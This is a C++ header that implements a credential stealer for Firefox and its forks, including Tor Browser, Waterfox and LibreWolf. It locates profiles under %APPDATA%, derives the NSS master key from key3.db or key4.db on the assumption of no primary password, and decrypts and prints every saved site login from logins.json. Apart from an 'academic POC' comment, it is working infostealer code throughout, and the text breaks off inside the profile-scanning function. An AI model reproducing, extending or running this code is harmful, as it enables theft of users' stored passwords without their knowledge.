#ifndef FIREFOX_DUMP_H
#define FIREFOX_DUMP_H

// Universal Mozilla-based browser credential extractor.
//
// Scans %APPDATA% recursively for any directory containing
// key3.db or key4.db alongside logins.json. Handles:
//
//   Firefox, Firefox ESR, Tor Browser, Waterfox, LibreWolf,
//   Mullvad Browser, Floorp, Pale Moon, SeaMonkey, IceCat,
//   Cyberfox, and any future fork using the same profile layout.
//
// Supports three key formats:
//   key3.db + 3DES-CBC       (Firefox < 53, Pale Moon, SeaMonkey)
//   key4.db + 3DES-CBC (v10) (Firefox 53 - 74)
//   key4.db + PBES2/AES-CBC/SDR ASN.1 (Firefox 75+)
//
// Supports three login entry formats in logins.json:
//   "v10" + 3DES-CBC
//   "v12" + AES-256-CBC
//   ASN.1 SEQUENCE (NSS SDR) — Firefox 132+
//
// ACADEMIC POC ONLY.

#include <windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include "sqlite3.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <filesystem>
#include <algorithm>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

namespace FirefoxDump {

    // =========================================================================
    // 1. Helpers
    // =========================================================================

    inline std::string WStringToString(const std::wstring& w) {
        if (w.empty()) return "";
        int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1,
                                      nullptr, 0, nullptr, nullptr);
        std::string r(sz - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &r[0], sz, nullptr, nullptr);
        return r;
    }

    inline std::string BytesToHex(const BYTE* d, size_t n) {
        std::ostringstream ss;
        for (size_t i = 0; i < n; ++i)
            ss << std::hex << std::setw(2) << std::setfill('0') << (int)d[i];
        return ss.str();
    }

    inline std::vector<BYTE> Base64Decode(const std::string& enc) {
        static const char* chars =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::vector<BYTE> out;
        int val = 0, valb = -8;
        for (unsigned char c : enc) {
            if (c == '=') break;
            const char* p = strchr(chars, c);
            if (!p) continue;
            val = (val << 6) + (int)(p - chars);
            valb += 6;
            if (valb >= 0) { out.push_back((BYTE)((val >> valb) & 0xFF)); valb -= 8; }
        }
        return out;
    }

    // =========================================================================
    // 2. Crypto primitives
    // =========================================================================

    inline std::vector<BYTE> Sha1(const std::vector<BYTE>& data) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_HASH_HANDLE hHash = NULL;
        std::vector<BYTE> result(20);
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, 0) != 0) return result;
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return result;
        }
        BCryptHashData(hHash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
        BCryptFinishHash(hHash, result.data(), 20, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return result;
    }

    inline std::vector<BYTE> HmacSha1(const std::vector<BYTE>& key,
                                       const std::vector<BYTE>& data) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_HASH_HANDLE hHash = NULL;
        std::vector<BYTE> result(20);
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL,
                                        BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0) return result;
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0,
                             (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return result;
        }
        BCryptHashData(hHash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
        BCryptFinishHash(hHash, result.data(), 20, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return result;
    }

    inline std::vector<BYTE> Pbkdf2Sha256(const std::vector<BYTE>& password,
                                           const std::vector<BYTE>& salt,
                                           DWORD iterations, DWORD keyLen) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        std::vector<BYTE> key(keyLen);
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
                                        BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0) return key;
        NTSTATUS st = BCryptDeriveKeyPBKDF2(
            hAlg,
            (PUCHAR)password.data(), (ULONG)password.size(),
            (PUCHAR)salt.data(), (ULONG)salt.size(),
            iterations, key.data(), keyLen, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        if (st != 0) key.clear();
        return key;
    }

    inline std::vector<BYTE> Decrypt3DES(const std::vector<BYTE>& key,
                                          const std::vector<BYTE>& iv,
                                          const std::vector<BYTE>& ciphertext) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::vector<BYTE> plain;
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_3DES_ALGORITHM, NULL, 0) != 0) return plain;
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                              sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return plain;
        }
        DWORD cbObj = 0, cbTmp = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                          (PUCHAR)&cbObj, sizeof(DWORD), &cbTmp, 0);
        std::vector<BYTE> obj(cbObj);
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, obj.data(), cbObj,
                                       (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return plain;
        }
        std::vector<BYTE> ivCopy = iv;
        DWORD cbOut = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(),
                          NULL, ivCopy.data(), (ULONG)ivCopy.size(),
                          NULL, 0, &cbOut, 0) == 0) {
            plain.resize(cbOut);
            ivCopy = iv;
            BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(),
                          NULL, ivCopy.data(), (ULONG)ivCopy.size(),
                          plain.data(), cbOut, &cbOut, 0);
            plain.resize(cbOut);
        }
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return plain;
    }

    inline std::vector<BYTE> DecryptAES(const std::vector<BYTE>& key,
                                         const std::vector<BYTE>& iv,
                                         const std::vector<BYTE>& ciphertext) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::vector<BYTE> plain;
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return plain;
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                              sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return plain;
        }
        DWORD cbObj = 0, cbTmp = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                          (PUCHAR)&cbObj, sizeof(DWORD), &cbTmp, 0);
        std::vector<BYTE> obj(cbObj);
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, obj.data(), cbObj,
                                       (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return plain;
        }
        std::vector<BYTE> ivCopy = iv;
        DWORD cbOut = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(),
                          NULL, ivCopy.data(), (ULONG)ivCopy.size(),
                          NULL, 0, &cbOut, 0) == 0) {
            plain.resize(cbOut);
            ivCopy = iv;
            BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(),
                          NULL, ivCopy.data(), (ULONG)ivCopy.size(),
                          plain.data(), cbOut, &cbOut, 0);
            plain.resize(cbOut);
        }
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return plain;
    }

    inline std::string DecryptAESGCM(const std::vector<BYTE>& ct,
                                      const std::vector<BYTE>& nonce,
                                      const std::vector<BYTE>& tag,
                                      const std::vector<BYTE>& key) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::string plain;
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return "";
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                              sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return "";
        }
        DWORD cbObj = 0, cbTmp = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                          (PUCHAR)&cbObj, sizeof(DWORD), &cbTmp, 0);
        std::vector<BYTE> obj(cbObj);

        DWORD blobLen = sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) + (DWORD)key.size();
        std::vector<BYTE> blob(blobLen);
        auto* hdr = (BCRYPT_KEY_DATA_BLOB_HEADER*)blob.data();
        hdr->dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        hdr->dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
        hdr->cbKeyData = (DWORD)key.size();
        memcpy(blob.data() + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER),
               key.data(), key.size());

        if (BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey,
                            obj.data(), cbObj, blob.data(), blobLen, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return "";
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
        BCRYPT_INIT_AUTH_MODE_INFO(ai);
        std::vector<BYTE> nCopy = nonce, tCopy = tag;
        ai.pbNonce = nCopy.data(); ai.cbNonce = (ULONG)nCopy.size();
        ai.pbTag   = tCopy.data(); ai.cbTag   = (ULONG)tCopy.size();

        DWORD cbPlain = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ct.data(), (ULONG)ct.size(),
                          &ai, NULL, 0, NULL, 0, &cbPlain, 0) == 0) {
            std::vector<BYTE> buf(cbPlain);
            if (BCryptDecrypt(hKey, (PUCHAR)ct.data(), (ULONG)ct.size(),
                              &ai, NULL, 0, buf.data(), cbPlain, &cbPlain, 0) == 0) {
                plain.assign(buf.begin(), buf.end());
            }
        }
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return plain;
    }

    // =========================================================================
    // 3. DER parser
    // =========================================================================

    struct DerNode {
        BYTE tag = 0;
        size_t headerLen = 0;
        size_t contentLen = 0;
        const BYTE* content = nullptr;
    };

    inline bool DerReadNode(const BYTE* data, size_t size, size_t offset, DerNode& out) {
        if (offset + 2 > size) return false;
        out.tag = data[offset];
        size_t pos = offset + 1;
        BYTE lenByte = data[pos++];
        if (lenByte & 0x80) {
            size_t numBytes = lenByte & 0x7F;
            if (numBytes > 4 || pos + numBytes > size) return false;
            size_t len = 0;
            for (size_t i = 0; i < numBytes; ++i)
                len = (len << 8) | data[pos++];
            out.contentLen = len;
        } else {
            out.contentLen = lenByte;
        }
        out.headerLen = pos - offset;
        if (pos + out.contentLen > size) return false;
        out.content = data + pos;
        return true;
    }

    // =========================================================================
    // 4. Key derivation — 3DES (legacy NSS PBE)
    // =========================================================================

    inline bool Derive3DESKey(const std::vector<BYTE>& globalSalt,
                               const std::vector<BYTE>& entrySalt,
                               std::vector<BYTE>& outKey,
                               std::vector<BYTE>& outIv) {
        std::vector<BYTE> emptyPassword;
        std::vector<BYTE> hpInput = globalSalt;
        hpInput.insert(hpInput.end(), emptyPassword.begin(), emptyPassword.end());
        std::vector<BYTE> hp = Sha1(hpInput);

        std::vector<BYTE> pes = entrySalt;
        pes.resize(20, 0x00);

        std::vector<BYTE> chpInput = hp;
        chpInput.insert(chpInput.end(), entrySalt.begin(), entrySalt.end());
        std::vector<BYTE> chp = Sha1(chpInput);

        std::vector<BYTE> k1Data = pes;
        k1Data.insert(k1Data.end(), entrySalt.begin(), entrySalt.end());
        std::vector<BYTE> k1 = HmacSha1(chp, k1Data);

        std::vector<BYTE> tk = HmacSha1(chp, pes);

        std::vector<BYTE> k2Data = tk;
        k2Data.insert(k2Data.end(), entrySalt.begin(), entrySalt.end());
        std::vector<BYTE> k2 = HmacSha1(chp, k2Data);

        std::vector<BYTE> k = k1;
        k.insert(k.end(), k2.begin(), k2.end());
        if (k.size() < 32) return false;

        outKey.assign(k.begin(), k.begin() + 24);
        outIv.assign(k.end() - 8, k.end());
        return true;
    }

    // =========================================================================
    // 5. Key derivation — PBES2 (Firefox 75+)
    // =========================================================================

    inline bool ExtractPbes2Params(const std::vector<BYTE>& a11,
                                    std::vector<BYTE>& outSalt,
                                    DWORD& outIterations,
                                    std::vector<BYTE>& outIv,
                                    std::vector<BYTE>& outEncryptedKey) {
        DerNode outer{};
        if (!DerReadNode(a11.data(), a11.size(), 0, outer) || outer.tag != 0x30) return false;

        size_t pos = 0;
        DerNode algoSeq{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, algoSeq) ||
            algoSeq.tag != 0x30) return false;
        pos += algoSeq.headerLen + algoSeq.contentLen;

        DerNode encKey{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, encKey) ||
            encKey.tag != 0x04) return false;
        outEncryptedKey.assign(encKey.content, encKey.content + encKey.contentLen);

        // Walk into algoSeq: OID id-PBES2 + SEQUENCE PBES2-params
        size_t algoPos = 0;
        DerNode oidPbes2{}, pbes2Params{};
        if (!DerReadNode(algoSeq.content, algoSeq.contentLen, algoPos, oidPbes2) ||
            oidPbes2.tag != 0x06) return false;
        algoPos += oidPbes2.headerLen + oidPbes2.contentLen;

        if (!DerReadNode(algoSeq.content, algoSeq.contentLen, algoPos, pbes2Params) ||
            pbes2Params.tag != 0x30) return false;

        // KDF + EncryptionScheme
        size_t pbesPos = 0;
        DerNode kdfSeq{}, encSchemeSeq{};
        if (!DerReadNode(pbes2Params.content, pbes2Params.contentLen, pbesPos, kdfSeq) ||
            kdfSeq.tag != 0x30) return false;
        pbesPos += kdfSeq.headerLen + kdfSeq.contentLen;

        if (!DerReadNode(pbes2Params.content, pbes2Params.contentLen, pbesPos, encSchemeSeq) ||
            encSchemeSeq.tag != 0x30) return false;

        // KDF: OID id-PBKDF2 + SEQUENCE pbkdf2Params
        size_t kdfPos = 0;
        DerNode oidPbkdf2{}, pbkdf2Params{};
        if (!DerReadNode(kdfSeq.content, kdfSeq.contentLen, kdfPos, oidPbkdf2) ||
            oidPbkdf2.tag != 0x06) return false;
        kdfPos += oidPbkdf2.headerLen + oidPbkdf2.contentLen;

        if (!DerReadNode(kdfSeq.content, kdfSeq.contentLen, kdfPos, pbkdf2Params) ||
            pbkdf2Params.tag != 0x30) return false;

        // pbkdf2Params: OCTET STRING salt + INTEGER iterations + ...
        size_t p2Pos = 0;
        DerNode saltNode{}, iterNode{};
        if (!DerReadNode(pbkdf2Params.content, pbkdf2Params.contentLen, p2Pos, saltNode) ||
            saltNode.tag != 0x04) return false;
        outSalt.assign(saltNode.content, saltNode.content + saltNode.contentLen);
        p2Pos += saltNode.headerLen + saltNode.contentLen;

        if (!DerReadNode(pbkdf2Params.content, pbkdf2Params.contentLen, p2Pos, iterNode) ||
            iterNode.tag != 0x02) return false;

        DWORD iter = 0;
        for (size_t i = 0; i < iterNode.contentLen; ++i)
            iter = (iter << 8) | iterNode.content[i];
        outIterations = iter;

        // EncryptionScheme: OID + OCTET STRING IV
        size_t esPos = 0;
        DerNode oidAes{}, ivNode{};
        if (!DerReadNode(encSchemeSeq.content, encSchemeSeq.contentLen, esPos, oidAes) ||
            oidAes.tag != 0x06) return false;
        esPos += oidAes.headerLen + oidAes.contentLen;

        if (!DerReadNode(encSchemeSeq.content, encSchemeSeq.contentLen, esPos, ivNode)) return false;

        if (ivNode.tag == 0x30) {
            DerNode innerIv{};
            if (DerReadNode(ivNode.content, ivNode.contentLen, 0, innerIv) &&
                innerIv.tag == 0x04) {
                outIv.assign(innerIv.content, innerIv.content + innerIv.contentLen);
            }
        } else if (ivNode.tag == 0x04) {
            outIv.assign(ivNode.content, ivNode.content + ivNode.contentLen);
        } else {
            return false;
        }

        return !outSalt.empty() && !outIv.empty() && !outEncryptedKey.empty();
    }

    inline bool TryPbes2Decrypt(const std::vector<BYTE>& a11,
                                 const std::vector<BYTE>& globalSalt,
                                 std::vector<BYTE>& outMasterKey) {
        std::vector<BYTE> salt, ivStored, encryptedKey;
        DWORD iterations = 0;

        if (!ExtractPbes2Params(a11, salt, iterations, ivStored, encryptedKey)) return false;

        // IV: prepend 04 0E (NSS bug)
        std::vector<BYTE> iv = { 0x04, 0x0E };
        iv.insert(iv.end(), ivStored.begin(), ivStored.end());
        if (iv.size() != 16) return false;

        // k_intermediate = SHA1(global_salt + empty_password)
        std::vector<BYTE> emptyPassword;
        std::vector<BYTE> hpInput = globalSalt;
        hpInput.insert(hpInput.end(), emptyPassword.begin(), emptyPassword.end());
        std::vector<BYTE> kIntermediate = Sha1(hpInput);

        // PBKDF2-SHA256(password=k_intermediate, salt=entry_salt, iterations)
        std::vector<BYTE> key = Pbkdf2Sha256(kIntermediate, salt, iterations, 32);
        if (key.empty()) return false;

        std::vector<BYTE> decrypted = DecryptAES(key, iv, encryptedKey);
        if (decrypted.empty()) return false;

        // Strip PKCS7 padding
        if (decrypted.empty()) return false;
        BYTE padLen = decrypted.back();
        if (padLen < 1 || padLen > 16 || padLen > decrypted.size()) return false;
        for (size_t i = decrypted.size() - padLen; i < decrypted.size(); ++i)
            if (decrypted[i] != padLen) return false;
        decrypted.resize(decrypted.size() - padLen);

        // Unwrap ASN.1 SEQUENCE { OCTET STRING key } if present
        DerNode outer{};
        if (DerReadNode(decrypted.data(), decrypted.size(), 0, outer) && outer.tag == 0x30) {
            DerNode keyNode{};
            if (DerReadNode(outer.content, outer.contentLen, 0, keyNode) &&
                keyNode.tag == 0x04) {
                outMasterKey.assign(keyNode.content, keyNode.content + keyNode.contentLen);
                return true;
            }
        }

        outMasterKey = decrypted;
        return true;
    }

    inline bool Try3DESDecrypt(const std::vector<BYTE>& globalSalt,
                                const std::vector<BYTE>& a11,
                                std::vector<BYTE>& outMasterKey) {
        DerNode outer{};
        if (!DerReadNode(a11.data(), a11.size(), 0, outer) || outer.tag != 0x30) return false;

        size_t pos = 0;
        DerNode algoSeq{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, algoSeq)) return false;
        pos += algoSeq.headerLen + algoSeq.contentLen;

        DerNode encData{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, encData)) return false;
        if (encData.tag != 0x04) return false;

        std::vector<BYTE> entrySalt;
        if (algoSeq.contentLen >= 20)
            entrySalt.assign(algoSeq.content, algoSeq.content + 20);
        else
            entrySalt.assign(algoSeq.content, algoSeq.content + algoSeq.contentLen);

        std::vector<BYTE> key24, iv8;
        if (!Derive3DESKey(globalSalt, entrySalt, key24, iv8)) return false;

        std::vector<BYTE> ciphertext(encData.content, encData.content + encData.contentLen);
        std::vector<BYTE> decrypted = Decrypt3DES(key24, iv8, ciphertext);
        if (decrypted.size() < 32) return false;

        DerNode innerSeq{};
        if (!DerReadNode(decrypted.data(), decrypted.size(), 0, innerSeq) ||
            innerSeq.tag != 0x30) return false;

        DerNode keyOctet{};
        if (!DerReadNode(innerSeq.content, innerSeq.contentLen, 0, keyOctet) ||
            keyOctet.tag != 0x04) return false;

        outMasterKey.assign(keyOctet.content, keyOctet.content + keyOctet.contentLen);
        return !outMasterKey.empty();
    }

    // =========================================================================
    // 6. key4.db extractor
    // =========================================================================

    inline bool ExtractKey4MasterKey(const std::filesystem::path& profilePath,
                                     std::vector<BYTE>& outKey) {
        std::filesystem::path dbPath = profilePath / "key4.db";

        sqlite3* db = nullptr;
        if (sqlite3_open(dbPath.string().c_str(), &db) != SQLITE_OK) return false;

        std::vector<BYTE> globalSalt;
        {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db,
                "SELECT item1 FROM metadata WHERE id = 'password';",
                -1, &stmt, NULL) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 0);
                    int len = sqlite3_column_bytes(stmt, 0);
                    if (blob && len > 0) globalSalt.assign(blob, blob + len);
                }
                sqlite3_finalize(stmt);
            }
        }

        std::vector<BYTE> a11;
        {
            sqlite3_stmt* stmt = nullptr;
            const char* sql = "SELECT a11 FROM nssPrivate "
                              "WHERE id = x'f8000000000000000000000000000001';";
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 0);
                    int len = sqlite3_column_bytes(stmt, 0);
                    if (blob && len > 0) a11.assign(blob, blob + len);
                }
                sqlite3_finalize(stmt);
            }
        }
        if (a11.empty()) {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db,
                "SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;",
                -1, &stmt, NULL) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 0);
                    int len = sqlite3_column_bytes(stmt, 0);
                    if (blob && len > 0) a11.assign(blob, blob + len);
                }
                sqlite3_finalize(stmt);
            }
        }

        sqlite3_close(db);
        if (a11.empty() || globalSalt.empty()) return false;

        if (TryPbes2Decrypt(a11, globalSalt, outKey) && !outKey.empty()) return true;
        if (Try3DESDecrypt(globalSalt, a11, outKey) && !outKey.empty()) return true;
        return false;
    }

    // =========================================================================
    // 7. key3.db extractor (legacy)
    // =========================================================================

    inline bool ExtractKey3MasterKey(const std::filesystem::path& profilePath,
                                     std::vector<BYTE>& outKey) {
        std::filesystem::path dbPath = profilePath / "key3.db";

        sqlite3* db = nullptr;
        if (sqlite3_open(dbPath.string().c_str(), &db) != SQLITE_OK) return false;

        std::vector<BYTE> globalSalt;
        {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db,
                "SELECT item1 FROM metadata WHERE id = 'password';",
                -1, &stmt, NULL) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 0);
                    int len = sqlite3_column_bytes(stmt, 0);
                    if (blob && len > 0) globalSalt.assign(blob, blob + len);
                }
                sqlite3_finalize(stmt);
            }
        }

        std::vector<BYTE> a11;
        {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db,
                "SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;",
                -1, &stmt, NULL) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 0);
                    int len = sqlite3_column_bytes(stmt, 0);
                    if (blob && len > 0) a11.assign(blob, blob + len);
                }
                sqlite3_finalize(stmt);
            }
        }

        sqlite3_close(db);
        if (a11.empty() || globalSalt.empty()) return false;

        return Try3DESDecrypt(globalSalt, a11, outKey) && !outKey.empty();
    }

    // =========================================================================
    // 8. Login entry decryption
    // =========================================================================

    inline std::string DecryptSdrEntry(const std::vector<BYTE>& data,
                                        const std::vector<BYTE>& masterKey) {
        DerNode outer{};
        if (!DerReadNode(data.data(), data.size(), 0, outer) || outer.tag != 0x30) return "";

        size_t pos = 0;
        DerNode keyId{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, keyId) ||
            keyId.tag != 0x04) return "";
        pos += keyId.headerLen + keyId.contentLen;

        DerNode algoSeq{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, algoSeq) ||
            algoSeq.tag != 0x30) return "";
        pos += algoSeq.headerLen + algoSeq.contentLen;

        size_t algoPos = 0;
        DerNode oid{}, ivNode{};
        if (!DerReadNode(algoSeq.content, algoSeq.contentLen, algoPos, oid) ||
            oid.tag != 0x06) return "";
        algoPos += oid.headerLen + oid.contentLen;

        if (!DerReadNode(algoSeq.content, algoSeq.contentLen, algoPos, ivNode) ||
            ivNode.tag != 0x04) return "";

        DerNode ctNode{};
        if (!DerReadNode(outer.content, outer.contentLen, pos, ctNode) ||
            ctNode.tag != 0x04) return "";

        // OID 2.16.840.1.101.3.4.1.42 = AES-256-CBC
        // OID 1.2.840.113549.3.7       = 3DES-CBC
        static const BYTE oidAes256Cbc[] = {
            0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2a
        };
        static const BYTE oid3DesCbc[] = {
            0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x03, 0x07
        };

        std::vector<BYTE> iv(ivNode.content, ivNode.content + ivNode.contentLen);
        std::vector<BYTE> ct(ctNode.content, ctNode.content + ctNode.contentLen);

        std::string plaintext;

        if (oid.contentLen == sizeof(oidAes256Cbc) &&
            memcmp(oid.content, oidAes256Cbc, sizeof(oidAes256Cbc)) == 0) {
            std::vector<BYTE> p = DecryptAES(masterKey, iv, ct);
            plaintext.assign(p.begin(), p.end());
        }
        else if (oid.contentLen == sizeof(oid3DesCbc) &&
                 memcmp(oid.content, oid3DesCbc, sizeof(oid3DesCbc)) == 0) {
            std::vector<BYTE> key(masterKey.begin(),
                                  masterKey.begin() + (masterKey.size() > 24 ? 24 : masterKey.size()));
            std::vector<BYTE> p = Decrypt3DES(key, iv, ct);
            plaintext.assign(p.begin(), p.end());
        }
        else return "";

        // Strip PKCS7 padding
        if (!plaintext.empty()) {
            BYTE pad = (BYTE)plaintext.back();
            if (pad >= 1 && pad <= 16 && pad <= plaintext.size()) {
                bool valid = true;
                for (size_t i = plaintext.size() - pad; i < plaintext.size(); ++i)
                    if ((BYTE)plaintext[i] != pad) { valid = false; break; }
                if (valid) plaintext.resize(plaintext.size() - pad);
            }
        }

        while (!plaintext.empty() && plaintext.back() == 0) plaintext.pop_back();
        return plaintext;
    }

    inline std::string DecryptLoginField(const std::string& b64,
                                          const std::vector<BYTE>& masterKey) {
        std::vector<BYTE> data = Base64Decode(b64);
        if (data.size() < 4) return "";

        std::string prefix((const char*)data.data(), 3);

        if (prefix == "v10") {
            if (data.size() < 11) return "";
            std::vector<BYTE> iv(data.begin() + 3, data.begin() + 11);
            std::vector<BYTE> ct(data.begin() + 11, data.end());
            std::vector<BYTE> key(masterKey.begin(),
                                  masterKey.begin() + (masterKey.size() > 24 ? 24 : masterKey.size()));
            std::vector<BYTE> p = Decrypt3DES(key, iv, ct);
            while (!p.empty() && p.back() == 0) p.pop_back();
            return std::string(p.begin(), p.end());
        }

        if (prefix == "v12") {
            if (data.size() < 19) return "";
            std::vector<BYTE> iv(data.begin() + 3, data.begin() + 19);
            std::vector<BYTE> ct(data.begin() + 19, data.end());
            std::vector<BYTE> p = DecryptAES(masterKey, iv, ct);
            while (!p.empty() && p.back() == 0) p.pop_back();
            return std::string(p.begin(), p.end());
        }

        // NSS SDR (ASN.1 SEQUENCE)
        if (data[0] == 0x30) {
            return DecryptSdrEntry(data, masterKey);
        }

        return "";
    }

    // =========================================================================
    // 9. logins.json parsing
    // =========================================================================

    inline std::string ExtractJsonString(const std::string& json, size_t startPos) {
        size_t q1 = json.find('"', startPos);
        if (q1 == std::string::npos) return "";
        size_t q2 = json.find('"', q1 + 1);
        if (q2 == std::string::npos) return "";
        return json.substr(q1 + 1, q2 - q1 - 1);
    }

    inline int DecryptLoginsFile(const std::filesystem::path& profilePath,
                                  const std::vector<BYTE>& masterKey) {
        std::filesystem::path jsonPath = profilePath / "logins.json";
        std::ifstream f(jsonPath);
        if (!f.is_open()) return 0;

        std::string json((std::istreambuf_iterator<char>(f)),
                          std::istreambuf_iterator<char>());
        f.close();

        size_t pos = 0;
        int count = 0;

        while ((pos = json.find("\"hostname\"", pos)) != std::string::npos) {
            std::string hostname = ExtractJsonString(json, pos + 10);

            size_t userPos = json.find("\"encryptedUsername\"", pos);
            size_t passPos = json.find("\"encryptedPassword\"", pos);
            if (userPos == std::string::npos || passPos == std::string::npos) {
                pos += 10; continue;
            }

            std::string encUser = ExtractJsonString(json, userPos + 19);
            std::string encPass = ExtractJsonString(json, passPos + 19);

            std::string user = DecryptLoginField(encUser, masterKey);
            std::string pass = DecryptLoginField(encPass, masterKey);

            if (!pass.empty()) {
                std::cout << "  [PASS] " << hostname
                          << " | User: " << user
                          << " | Pass: " << pass << "\n";
                count++;
            }
            pos = passPos + 19;
        }
        return count;
    }

    // =========================================================================
    // 10. Universal profile scanner
    // =========================================================================

    struct ProfileLocation {
        std::wstring browserName;
        std::filesystem::path profilePath;
    };

    // Recursively scan for directories containing key3.db/key4.db + logins.json.
    inline void ScanForProfiles(const std::filesystem::path& root,
                                 int depth,
                                 std::vector<ProfileLocation>& out) {
        if (depth <= 0) return;

        std::error_code ec;
        std::filesystem::directory_iterator it(root, ec);
        if (ec) return;

        for (auto& entry : it) {
            if (!entry.is_directory()) continue;

            bool hasKey4 = std::filesystem::exists(entry.path() / "key4.db");
            bool hasKey3 = std::filesystem::exists(entry.path() / "key3.db");
            bool hasLogins = std::filesystem::exists(entry.path() / "logins.json");

            if ((hasKey4 || hasKey3) && hasLogins) {
                // Found a profile — record it with the parent-of-parent as
